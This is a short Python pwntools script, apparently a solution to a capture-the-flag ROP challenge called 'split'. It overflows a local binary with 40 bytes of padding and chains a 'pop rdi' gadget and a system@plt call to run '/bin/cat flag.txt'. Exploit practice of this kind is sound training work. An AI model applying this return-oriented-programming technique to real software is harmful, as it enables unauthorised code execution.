from pwn import *

target = process("./split")

set_rdi_gadget = 0x4007c3 # 0x4007c3: pop rdi; ret;
command_str = 0x601060 # 0x601060: "/bin/cat flag.txt"
call_system_gadget = 0x40074b # 0x40074b: call 0x400560 <system@plt>

payload = b"A"*40 
payload += p64(set_rdi_gadget) + p64(command_str)
payload += p64(call_system_gadget)

target.sendline(payload)
target.interactive()
